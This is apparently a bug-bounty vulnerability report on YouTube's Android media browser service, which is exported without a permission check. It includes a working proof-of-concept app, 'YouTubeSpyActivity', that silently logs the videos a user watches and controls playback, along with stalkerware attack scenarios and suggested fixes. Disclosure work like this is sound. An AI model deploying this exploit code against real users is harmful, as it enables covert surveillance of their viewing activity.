# VRP Report #39: YouTube Unprotected MediaBrowserService — Viewing Activity Leak + Playback Control

## Summary
YouTube's `MainAppMediaBrowserService` is exported without any permission restriction. Any installed app can connect via the standard `MediaBrowser` API and obtain YouTube's `MediaSession` token. This allows reading the user's currently playing video metadata (title, channel, thumbnail) — leaking their viewing activity — and controlling playback (play, pause, stop, skip) without user consent.

## Affected Component
- **App**: YouTube (`com.google.android.youtube`)
- **Component**: `com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService`
- **Type**: Service (MediaBrowserService)
- **Exported**: true
- **Permission**: NONE

## Vulnerability Details

### Manifest Declaration
```xml
<service android:exported="true"
    android:name="com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService">
    <intent-filter>
        <action android:name="android.media.browse.MediaBrowserService"/>
    </intent-filter>
</service>
```

No `android:permission` attribute.

### onGetRoot() — Only Blocks SystemUI (MainAppMediaBrowserService.java)
```java
@Override  // onGetRoot equivalent
public final cun b(String str) {
    if (str.equals("com.android.systemui")) {
        return null;          // ONLY SystemUI is blocked
    }
    return new cun(null);    // ALL other callers get a root connection
}
```

The service accepts connections from ANY app except SystemUI. No package validation, no signature check, no permission verification.

### MediaSession Token Exposure (onCreate)
```java
@Override
public final void onCreate() {
    super.onCreate();
    ff ffVar = (ff) this.g.e.mM();
    ffVar.n();
    fe feVarC = ffVar.c();     // Gets the MediaSession token
    // Sets session token on the service — available to all connected clients
}
```

## Proof of Concept

### Via malicious app (zero permissions):
```java
public class YouTubeSpyActivity extends Activity {
    private MediaBrowser mediaBrowser;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        mediaBrowser = new MediaBrowser(this,
            new ComponentName("com.google.android.youtube",
                "com.google.android.apps.youtube.app.extensions.mediabrowser.impl.MainAppMediaBrowserService"),
            new MediaBrowser.ConnectionCallback() {
                @Override
                public void onConnected() {
                    // Get the MediaSession token
                    MediaSession.Token token = mediaBrowser.getSessionToken();
                    MediaController controller = new MediaController(
                        YouTubeSpyActivity.this, token);

                    // READ: Currently playing video metadata
                    MediaMetadata metadata = controller.getMetadata();
                    if (metadata != null) {
                        String title = metadata.getString(MediaMetadata.METADATA_KEY_TITLE);
                        String artist = metadata.getString(MediaMetadata.METADATA_KEY_ARTIST);
                        Log.d("SPY", "User watching: " + title + " by " + artist);
                    }

                    // READ: Playback state
                    PlaybackState state = controller.getPlaybackState();
                    Log.d("SPY", "State: " + state.getState());

                    // CONTROL: Pause the video
                    controller.getTransportControls().pause();

                    // CONTROL: Skip to next
                    controller.getTransportControls().skipToNext();

                    // MONITOR: Real-time state changes
                    controller.registerCallback(new MediaController.Callback() {
                        @Override
                        public void onMetadataChanged(MediaMetadata metadata) {
                            String title = metadata.getString(
                                MediaMetadata.METADATA_KEY_TITLE);
                            Log.d("SPY", "Now watching: " + title);
                        }
                    });
                }
            },
            null);

        mediaBrowser.connect();
    }
}
```

### Via ADB (testing):
```bash
# Verify the service accepts connections by checking logcat
adb shell am startservice -n com.google.android.youtube/.app.extensions.mediabrowser.impl.MainAppMediaBrowserService
```

## Impact

### Viewing Activity Privacy Leak (HIGH)
- Any installed app can silently monitor what the user is watching on YouTube in real-time
- Metadata exposed: video title, channel/artist name, album art/thumbnail, duration
- Continuous monitoring via `MediaController.Callback` tracks every video change
- No user notification or consent for this surveillance

### Unauthorized Playback Control (MEDIUM)
- Any app can pause, play, stop, skip, or seek in YouTube playback
- This can be used for harassment, disruption, or as part of a social engineering attack
- Combined with the viewing leak, an attacker knows WHAT the user is watching AND can control it

### Attack Scenarios
1. **Stalkerware**: A covert app continuously monitors YouTube viewing habits — video titles, channels watched, times of day — building a behavioral profile
2. **Targeted advertising**: A competitor app monitors viewing patterns to serve targeted ads
3. **Disruption**: A malicious app periodically pauses or skips YouTube playback, degrading user experience

## Severity Assessment
- **Confidentiality**: HIGH (viewing activity is sensitive personal data)
- **Integrity**: MEDIUM (playback can be controlled without authorization)
- **User Interaction**: NONE (zero-click, fully automated monitoring)
- **Permissions Required**: NONE (zero permissions)
- **Attack Complexity**: LOW (standard MediaBrowser API)

## Fix Recommendation

### Option 1: Add caller validation in onGetRoot()
```java
@Override
public BrowserRoot onGetRoot(String clientPackageName, int clientUid, Bundle rootHints) {
    // Allow only Google-signed apps
    if (!GoogleSignatureVerifier.getInstance().isGooglePackage(getPackageManager(), clientPackageName)) {
        return null;  // Reject non-Google callers
    }
    // Also block SystemUI
    if (clientPackageName.equals("com.android.systemui")) {
        return null;
    }
    return new BrowserRoot("root", null);
}
```

### Option 2: Add permission restriction
```xml
<service android:exported="true"
    android:permission="com.google.android.youtube.permission.MEDIA_BROWSE"
    android:name="...MainAppMediaBrowserService">
```

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
- YouTube as bundled
